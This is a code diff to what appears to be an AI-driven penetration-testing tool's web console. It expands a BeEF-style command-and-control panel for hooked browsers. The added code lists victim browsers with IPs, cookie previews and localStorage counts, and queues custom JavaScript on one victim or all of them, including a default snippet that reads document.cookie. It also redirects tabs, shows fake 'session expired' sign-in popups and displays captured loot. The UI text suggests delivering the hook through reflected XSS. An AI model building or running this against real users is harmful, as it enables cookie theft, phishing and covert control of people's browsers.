@@ -24,7 +24,7 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 from core.config import CFG, configure_api_key
 from core.llm import get_llm
-from tools.beef import DEMO_VICTIM_HTML, get_beef_server
+from tools.beef import BEEF_MODULE_BY_ID, DEMO_VICTIM_HTML, build_module_js, get_beef_server
 from tools.oob import get_oob_manager
 from tools.registry import ToolRegistry
 from agents.agent import AGENT_BUS
@@ -318,6 +318,35 @@ HTML_PAGE = r"""<!DOCTYPE html>
   .jump.show { display: grid; }
   .jump:active { background: #26262e; }
 
+  /* ---------- BeEF hooked browsers ---------- */
+  .zlist { display: flex; flex-direction: column; gap: 4px; }
+  .zrow {
+    display: flex; align-items: center; gap: 8px; width: 100%; text-align: left; min-height: 42px;
+    background: #101014; border: 1px solid var(--border); border-radius: 9px;
+    padding: 6px 9px; color: var(--fg); font-size: 11.5px;
+  }
+  .zrow:hover { border-color: #3d3d47; }
+  .zrow.sel { border-color: var(--cyan); background: #0f2029; }
+  .zrow .zdot { width: 8px; height: 8px; border-radius: 50%; flex: none; background: #52525b; }
+  .zrow .zdot.on { background: var(--green); box-shadow: 0 0 7px rgba(52,211,153,.85); }
+  .zrow .zdot.off { background: #52525b; }
+  .zrow .zmain { min-width: 0; flex: 1; }
+  .zrow .zmain b { display: block; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 11.5px; color: #9be7ff; }
+  .zrow .zmain small { display: block; color: var(--muted); font-size: 10.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .zrow .zmeta { color: var(--muted); font-size: 9.5px; flex: none; text-align: right; }
+  .kv { display: grid; grid-template-columns: 108px 1fr; gap: 3px 8px; font-size: 11px; align-items: baseline; }
+  .kv span:nth-child(odd) { color: var(--muted); }
+  .kv span:nth-child(even) { word-break: break-word; min-width: 0; }
+  .kv code { font-size: 10.5px; }
+  .beef-cat {
+    display: flex; justify-content: space-between; align-items: baseline; margin: 13px 0 6px;
+    padding-bottom: 4px; border-bottom: 1px solid #1c1c22;
+    font-size: 10px; text-transform: uppercase; letter-spacing: .8px; color: var(--muted);
+  }
+  .panel .bf-field { display: flex; gap: 6px; margin: 5px 0 8px; }
+  .panel .bf-field input { margin: 0; flex: 1; min-width: 0; }
+  .panel .bf-field .btn { flex: none; white-space: nowrap; }
+
   /* ---------- Mobile bottom action bar ---------- */
   .mobile-nav { display: none; }
 
@@ -553,6 +582,7 @@ let pollTimer = null;
 let toolsCache = [];
 let panel = '';
 let selectedSid = '*';
+let beefNote = '';
 let lastThreadSig = '';
 let lastPanelSig = '';
 
@@ -616,7 +646,7 @@ function mobileTab(tab) {
 
 function openPanel(name) {
   panel = name;
-  const titles = { ops: 'Live operations', findings: 'Findings, chains & PoCs', beef: 'BeEF hook C2 & OOB', arsenal: 'Arsenal status', keys: 'LLM / API key', about: 'How to drive the agent' };
+  const titles = { ops: 'Live operations', findings: 'Findings, chains & PoCs', beef: 'BeEF — hooked browsers', arsenal: 'Arsenal status', keys: 'LLM / API key', about: 'How to drive the agent' };
   $('panelTitle').textContent = titles[name] || name;
   $('panel').classList.add('show');
   $('backdrop').classList.add('show');
@@ -907,6 +937,7 @@ function panelSignature() {
     panel, st.current_stage, st.verified_count, st.disproved_count, st.chains_count,
     (t.events || []).length, (t.active_processes || []).length, (t.recent_processes || []).length,
     (b.loot || []).length, (b.command_log || []).length, (b.sessions_list || []).length,
+    (b.sessions_list || []).map(x => `${x.sid}:${x.online ? 1 : 0}:${Math.floor((x.age_sec || 0) / 6)}`).join(','),
     (o.hits || []).length, selectedSid, toolsCache.length, JSON.stringify(st.llm || {})
   ].join('|');
 }
@@ -919,6 +950,10 @@ function renderPanel() {
   lastPanelSig = sig;
 
   const typedJs = ($('customJs') && $('customJs').value) || '';
+  const typedFields = {};
+  document.querySelectorAll('[data-bf-mod]').forEach(el => {
+    typedFields[el.getAttribute('data-bf-mod') + ':' + el.getAttribute('data-bf-key')] = el.value;
+  });
   const scrollTop = body.scrollTop;
 
   if (panel === 'ops') body.innerHTML = opsPanel();
@@ -929,6 +964,10 @@ function renderPanel() {
   else if (panel === 'about') body.innerHTML = aboutPanel();
 
   if (typedJs && $('customJs')) $('customJs').value = typedJs;
+  document.querySelectorAll('[data-bf-mod]').forEach(el => {
+    const v = typedFields[el.getAttribute('data-bf-mod') + ':' + el.getAttribute('data-bf-key')];
+    if (v) el.value = v;
+  });
   body.scrollTop = scrollTop;
 }
 
@@ -1002,6 +1041,85 @@ function findingsPanel() {
       </div>`).join('') : '<div class="empty">No chains built yet.</div>'}`;
 }
 
+function fmtAgo(sec) {
+  const n = Math.max(0, Math.round(sec || 0));
+  if (n < 60) return n + 's';
+  if (n < 3600) return Math.round(n / 60) + 'm';
+  if (n < 86400) return Math.round(n / 3600) + 'h';
+  return Math.round(n / 86400) + 'd';
+}
+function fmtClock(ts) {
+  return ts ? new Date(ts * 1000).toLocaleTimeString() : '—';
+}
+
+function beefRow(s) {
+  const host = s.host || s.origin || '—';
+  const label = s.browser && s.browser !== 'Unknown' ? s.browser : 'unknown browser';
+  return `<button class="zrow ${selectedSid === s.sid ? 'sel' : ''}" onclick="selectSid('${esc(s.sid)}')">
+    <span class="zdot ${s.online ? 'on' : 'off'}"></span>
+    <div class="zmain"><b>${esc(s.sid)}</b><small>${esc(label)} — ${esc(host)}</small></div>
+    <span class="zmeta">${s.online ? 'live · ' + fmtAgo(s.age_sec) : 'offline ' + fmtAgo(s.age_sec)}</span>
+  </button>`;
+}
+
+function beefDetails(s) {
+  const rows = [
+    ['Session ID', `<code>${esc(s.sid)}</code>`],
+    ['Status', s.online ? '<span style="color:var(--green)">online</span>' : '<span style="color:var(--muted)">offline</span>'],
+    ['Browser', esc(s.browser || '—')],
+    ['Engine / OS', `${esc(s.engine || '—')} · ${esc(s.os || '—')}${s.mobile ? ' · mobile' : ''}`],
+    ['IP address', `<code>${esc(s.remote || '—')}</code>`],
+    ['Hooked page', esc(s.title || '(untitled)')],
+    ['URL', `<code>${esc(s.href || '—')}</code>`],
+    ['Host', esc(s.host || '—')],
+    ['Cookies', `${s.cookies || 0} bytes${s.cookie_preview ? ` · <code>${esc(String(s.cookie_preview).slice(0, 64))}</code>` : ''}`],
+    ['DOM', `${s.forms || 0} forms · ${s.inputs || 0} inputs · ${s.links || 0} links`],
+    ['localStorage', `${s.local_keys || 0} keys`],
+    ['Screen / lang', `${esc(s.screen || '—')} · ${esc(s.lang || '—')}`],
+    ['Platform', esc(s.platform || '—')],
+    ['First hooked', fmtClock(s.first_seen)],
+    ['Last seen', `${fmtAgo(s.age_sec)} ago (${fmtClock(s.last_seen)})`],
+    ['Commands', `${s.commands_run || 0} run · ${s.queued || 0} queued`],
+    ['Finding', esc(s.finding_id || '—')],
+  ];
+  return `<div class="card"><div class="kv">${rows.map(r => `<span>${r[0]}</span><span>${r[1]}</span>`).join('')}</div></div>`;
+}
+
+function beefModuleTree(modules, targetLabel) {
+  if (!modules.length) return '<div class="empty">No modules loaded.</div>';
+  const cats = {};
+  modules.forEach(m => { (cats[m.category || 'Other'] = cats[m.category || 'Other'] || []).push(m); });
+  const riskColor = { critical: 'var(--red)', high: 'var(--yellow)', medium: 'var(--cyan)', low: 'var(--muted)' };
+  return Object.keys(cats).map(cat => `
+    <div class="beef-cat"><span>${esc(cat)}</span><span>${cats[cat].length} module(s)</span></div>
+    ${cats[cat].map(m => `<div class="card">
+      <div class="row"><strong>${esc(m.name)}</strong>
+        <span class="kindtag" style="color:${riskColor[m.risk] || 'var(--muted)'}">${esc(m.risk)}</span></div>
+      <div style="color:var(--muted);font-size:10.8px;margin:3px 0 5px">${esc(m.description)}</div>
+      ${(m.fields || []).map(f => `<div class="bf-field">
+        <input data-bf-mod="${esc(m.id)}" data-bf-key="${esc(f.key)}" placeholder="${esc(f.placeholder || '')}" value="${esc(f.default || '')}" />
+      </div>`).join('')}
+      <button class="btn primary" onclick="beefRun('${esc(m.id)}')">▶ Run on ${esc(targetLabel)}</button>
+    </div>`).join('')}`).join('');
+}
+
+function beefCommandResults(log, sel) {
+  const rows = (sel ? log.filter(c => c.sid === sel.sid) : log).slice(0, 10);
+  if (!rows.length) return '<div class="empty">No commands run yet.</div>';
+  return rows.map(c => `<div class="card"><div class="row"><strong>${esc(c.label)} → ${esc(c.sid)}</strong>
+      <span class="kindtag">${esc(c.status)}</span></div>
+      ${c.output ? `<pre class="code">${esc(c.output)}</pre>` : '<div class="empty">waiting for the browser to poll…</div>'}
+    </div>`).join('');
+}
+
+function beefLoot(loot, sel) {
+  const rows = (sel ? loot.filter(l => l.sid === sel.sid) : loot).slice(0, 8);
+  if (!rows.length) return '<div class="empty">No loot captured yet.</div>';
+  return rows.map(l => `<div class="card ok"><div class="row"><strong>${esc(l.kind)} · ${esc(l.sid)}</strong>
+      <span style="color:var(--muted)">${fmtClock(l.ts)}</span></div>
+      <pre class="code">${esc(JSON.stringify(l.data, null, 2))}</pre></div>`).join('');
+}
+
 function beefPanel() {
   const b = state.beef || {};
   const sessions = b.sessions_list || [];
@@ -1011,36 +1129,82 @@ function beefPanel() {
   const oob = (state.oob && state.oob.hits) || [];
   const hook = window.location.href.split('?')[0].split('#')[0].replace(/\/+$/, '') + '/beef/hook.js';
 
+  // keep the selection valid, and default to the only zombie when there is exactly one
+  if (selectedSid !== '*' && !sessions.some(s => s.sid === selectedSid)) selectedSid = '*';
+  if (selectedSid === '*' && sessions.length === 1) selectedSid = sessions[0].sid;
+
+  const online = sessions.filter(s => s.online);
+  const offline = sessions.filter(s => !s.online);
+  const sel = sessions.find(s => s.sid === selectedSid) || null;
+  const targetLabel = sel ? sel.sid : `all ${sessions.length} browser(s)`;
+
   return `
     <div class="card">
-      <b>Browser hook stager</b>
-      <pre class="code">${esc(hook)}</pre>
-      <div class="panel-actions" style="margin-top:6px">
+      <div class="row"><b>BeEF C2</b>
+        <span><b style="color:var(--green)">${online.length} online</b> · ${offline.length} offline · ${sessions.length} total</span></div>
+      <div class="empty" style="margin:4px 0 0">hook: <code>${esc(hook)}</code></div>
+      <div class="panel-actions" style="margin-top:7px">
         <button onclick="spawnVictim()">🪝 Hook demo victim</button>
         <button onclick="navigator.clipboard && navigator.clipboard.writeText('${esc(hook)}')">Copy hook.js</button>
         <button onclick="mintOob()">📡 Mint + test OOB</button>
       </div>
+      <div id="beefNote" class="empty" style="color:var(--yellow)">${esc(beefNote)}</div>
     </div>
-    <h4>Hooked browsers (${sessions.length})</h4>
-    <div class="panel-actions">
-      <button class="${selectedSid === '*' ? 'primary' : ''}" onclick="selectSid('*')">* broadcast</button>
-      ${sessions.map(s => `<button class="${selectedSid === s.sid ? 'primary' : ''}" onclick="selectSid('${esc(s.sid)}')">${s.online ? '🟢' : '🟡'} ${esc(s.sid)}</button>`).join('')}
+
+    <h4>Online browsers (${online.length})</h4>
+    <div class="zlist">
+      <button class="zrow ${selectedSid === '*' ? 'sel' : ''}" onclick="selectSid('*')">
+        <span class="zdot ${sessions.length ? 'on' : 'off'}"></span>
+        <div class="zmain"><b>* broadcast</b><small>run the next command on every hooked browser</small></div>
+        <span class="zmeta">${sessions.length}</span>
+      </button>
+      ${online.map(beefRow).join('') || '<div class="empty">No browser is beaconing right now — hook the demo victim, or deliver <code>hook.js</code> through a reflected XSS.</div>'}
     </div>
-    <h4>Attack modules</h4>
-    ${modules.length ? modules.map(m => `<button class="btn" style="width:100%;text-align:left;margin-bottom:6px" onclick="beefModule(${JSON.stringify(m.id)}, ${JSON.stringify(m.name)}, ${JSON.stringify(m.js)})">
-        <b>${esc(m.name)}</b> <span class="kindtag">${esc(m.risk)}</span><br><small style="color:var(--muted)">${esc(m.description)}</small>
-      </button>`).join('') : '<div class="empty">No modules loaded.</div>'}
-    <h4>Custom JavaScript</h4>
-    <textarea id="customJs" rows="3">({title: document.title, cookies: document.cookie, ua: navigator.userAgent})</textarea>
-    <button class="btn primary" onclick="runCustomJs()">⚡ Execute on ${selectedSid === '*' ? 'all hooked browsers' : esc(selectedSid)}</button>
+
+    <h4>Offline browsers (${offline.length})</h4>
+    <div class="zlist">
+      ${offline.map(beefRow).join('') || '<div class="empty">No offline sessions.</div>'}
+    </div>
+
+    <h4>Details${sel ? ' — ' + esc(sel.sid) : ''}</h4>
+    ${sel ? beefDetails(sel) : '<div class="empty">Select a hooked browser to inspect its session, then drive it with a module.</div>'}
+    ${sel ? `<div class="panel-actions">
+        <button class="btn" onclick="spawnVictim()">🔄 Re-hook demo victim</button>
+        <button class="btn success" onclick="beefSession('${esc(sel.sid)}','unhook')">⛔ Unhook</button>
+        <button class="btn danger" onclick="beefDelete('${esc(sel.sid)}')">🗑 Delete session</button>
+      </div>` : ''}
+
+    <h4>Quick commands <span style="color:var(--muted);text-transform:none">→ ${esc(targetLabel)}</span></h4>
+    <div class="card">
+      <b>➡ Redirect the tab</b>
+      <div class="bf-field">
+        <input data-bf-mod="_quick" data-bf-key="redirect" placeholder="https://example.com/login" />
+        <button class="btn primary" onclick="beefRedirect()">Go</button>
+      </div>
+      <b>💬 Popup message</b>
+      <div class="bf-field">
+        <input data-bf-mod="_quick" data-bf-key="popup" placeholder="Your session expired. Sign in again." />
+        <button class="btn primary" onclick="beefPopup()">Show</button>
+      </div>
+      <b>⚡ Custom JavaScript</b>
+      <textarea id="customJs" rows="3">({title: document.title, cookies: document.cookie, ua: navigator.userAgent})</textarea>
+      <button class="btn primary" onclick="runCustomJs()">Execute on ${esc(targetLabel)}</button>
+    </div>
+
+    <h4>Modules (${modules.length})</h4>
+    ${beefModuleTree(modules, targetLabel)}
+
+    <h4>Command results${sel ? ' — ' + esc(sel.sid) : ''}</h4>
+    ${beefCommandResults(log, sel)}
+
     <h4>Captured loot (${loot.length})</h4>
-    ${loot.length ? loot.slice().reverse().map(l => `<div class="card ok"><div class="row"><strong>${esc(l.kind)} · ${esc(l.sid)}</strong><span style="color:var(--muted)">${new Date((l.ts || 0) * 1000).toLocaleTimeString()}</span></div><pre class="code">${esc(JSON.stringify(l.data, null, 2))}</pre></div>`).join('') : '<div class="empty">No loot captured yet.</div>'}
-    <h4>Command results</h4>
-    ${log.length ? log.slice().reverse().map(c => `<div class="card"><div class="row"><strong>${esc(c.label)} → ${esc(c.sid)}</strong><span class="kindtag">${esc(c.status)}</span></div>${c.output ? `<pre class="code">${esc(c.output)}</pre>` : '<div class="empty">waiting for the browser to poll…</div>'}</div>`).join('') : '<div class="empty">No commands queued.</div>'}
+    ${beefLoot(loot, sel)}
+
     <h4>OOB callbacks (${oob.length})</h4>
     ${oob.length ? oob.slice().reverse().map(h => `<div class="card high"><strong>${esc(h.method || 'HIT')} ${esc(h.path || h.token)}</strong><div style="color:var(--muted);font-size:11px">${esc(h.remote || '')} · ${esc(h.channel || '')}</div></div>`).join('') : '<div class="empty">No callbacks recorded.</div>'}
     <div class="empty">The victim browser sandbox is docked at the bottom of this panel.</div>`;
 }
+
 
 function arsenalPanel() {
   if (!toolsCache.length) return '<div class="empty">Loading arsenal…</div>';
@@ -1093,19 +1257,78 @@ function spawnVictim() {
   const frame = $('victimFrame');
   if (frame) frame.src = 'beef/victim?t=' + Date.now();
 }
-async function beefModule(id, name, js) {
-  await api('api/beef/command', {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ sid: selectedSid, module: id, label: name, js })
+function beefSetNote(msg) {
+  beefNote = msg || '';
+  const el = $('beefNote');
+  if (el) el.textContent = beefNote;
+}
+async function beefPost(url, payload) {
+  const res = await fetch(url, {
+    method: 'POST', credentials: 'same-origin',
+    headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
   });
+  let data = {};
+  try { data = await res.json(); } catch (e) { data = {}; }
+  if (!res.ok) data = Object.assign({ error: 'HTTP ' + res.status }, data);
+  return data;
+}
+function beefFieldValues(modId) {
+  const values = {};
+  document.querySelectorAll(`[data-bf-mod="${modId}"]`).forEach(el => {
+    values[el.getAttribute('data-bf-key')] = el.value;
+  });
+  return values;
+}
+function beefTargetMissing() {
+  if (selectedSid === '*') return false;
+  const sessions = (state.beef && state.beef.sessions_list) || [];
+  return !sessions.some(s => s.sid === selectedSid);
+}
+async function beefRun(modId) {
+  if (beefTargetMissing()) { beefSetNote('That browser is gone — pick another zombie.'); return; }
+  const data = await beefPost('api/beef/command', { sid: selectedSid, module: modId, values: beefFieldValues(modId) });
+  if (data.error) beefSetNote('⚠ ' + data.error);
+  else beefSetNote(`queued \`${modId}\` on ${selectedSid} — waiting for the next poll`);
   setTimeout(refreshState, 400);
-  setTimeout(refreshState, 1300);
+  setTimeout(refreshState, 1500);
+}
+async function beefRedirect() {
+  const values = beefFieldValues('_quick');
+  const url = (values.redirect || '').trim();
+  if (!url) { beefSetNote('⚠ Enter a redirect URL first.'); return; }
+  const data = await beefPost('api/beef/command', { sid: selectedSid, module: 'redirect_browser', values: { url } });
+  beefSetNote(data.error ? '⚠ ' + data.error : `redirect queued on ${selectedSid}`);
+  setTimeout(refreshState, 400);
+  setTimeout(refreshState, 1500);
+}
+async function beefPopup() {
+  const values = beefFieldValues('_quick');
+  const message = (values.popup || '').trim() || 'Your session expired. Please sign in again.';
+  const data = await beefPost('api/beef/command', { sid: selectedSid, module: 'popup_message', values: { message } });
+  beefSetNote(data.error ? '⚠ ' + data.error : `popup queued on ${selectedSid}`);
+  setTimeout(refreshState, 400);
+  setTimeout(refreshState, 1500);
+}
+async function beefSession(sid, action) {
+  const data = await beefPost('api/beef/session', { sid, action });
+  if (data.error) beefSetNote('⚠ ' + data.error);
+  if (action !== 'unhook' && selectedSid === sid) selectedSid = '*';
+  await refreshState();
+}
+function beefDelete(sid) {
+  if (!confirm(`Delete session ${sid} from the C2?`)) return;
+  beefSession(sid, 'delete');
 }
 async function runCustomJs() {
   const js = ($('customJs') && $('customJs').value.trim()) || '';
-  if (!js) return;
-  await beefModule('custom_js', 'Custom JS', js);
+  if (!js) { beefSetNote('⚠ Write some JavaScript first.'); return; }
+  if (beefTargetMissing()) { beefSetNote('That browser is gone — pick another zombie.'); return; }
+  const data = await beefPost('api/beef/command', { sid: selectedSid, module: 'custom_js', label: 'Custom JS', js });
+  beefSetNote(data.error ? '⚠ ' + data.error : `custom JS queued on ${selectedSid}`);
+  setTimeout(refreshState, 400);
+  setTimeout(refreshState, 1500);
 }
+
 async function mintOob() {
   await api('api/oob/test', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
   await refreshState();
@@ -1399,6 +1622,14 @@ def start_warroom_server(
                 js_code = (body.get("js") or "").strip()
                 mod_name = (body.get("module") or "custom_js").strip()
                 label = (body.get("label") or mod_name).strip()
+                module = BEEF_MODULE_BY_ID.get(mod_name)
+                if module is not None:
+                    label = (body.get("label") or module.get("name") or mod_name).strip()
+                    try:
+                        js_code = build_module_js(module, body.get("values") or {})
+                    except ValueError as exc:
+                        self._json(400, {"error": str(exc)})
+                        return
                 if not js_code:
                     self._json(400, {"error": "Missing js payload"})
                     return
@@ -1406,8 +1637,34 @@ def start_warroom_server(
                     queued = beef_srv.broadcast_command(js_code, module_name=mod_name, label=label)
                     self._json(200, {"ok": True, "broadcast": True, "queued_ids": queued})
                 else:
+                    if sid not in beef_srv.sessions:
+                        self._json(404, {"error": f"Unknown hooked browser `{sid}`"})
+                        return
                     cid = beef_srv.queue_command(sid, js_code, module_name=mod_name, label=label)
                     self._json(200, {"ok": True, "cmd_id": cid, "sid": sid})
+                return
+
+            if path == "/api/beef/session":
+                sid = (body.get("sid") or "").strip()
+                action = (body.get("action") or "delete").strip().lower()
+                if not sid:
+                    self._json(400, {"error": "Missing sid"})
+                    return
+                if action in ("delete", "remove", "forget"):
+                    existed = beef_srv.remove_session(sid)
+                    self._json(200, {"ok": existed, "deleted": sid, "beef": beef_srv.snapshot()})
+                    return
+                if action in ("unhook", "stop", "kill"):
+                    if sid not in beef_srv.sessions:
+                        self._json(404, {"error": f"Unknown hooked browser `{sid}`"})
+                        return
+                    cid = beef_srv.queue_command(
+                        sid, "window.__BEEF_STOP__ && window.__BEEF_STOP__();",
+                        module_name="unhook", label="Unhook browser",
+                    )
+                    self._json(200, {"ok": True, "cmd_id": cid, "sid": sid, "queued": "unhook"})
+                    return
+                self._json(400, {"error": f"Unknown action `{action}`"})
                 return
 
             if path == "/api/oob/test":
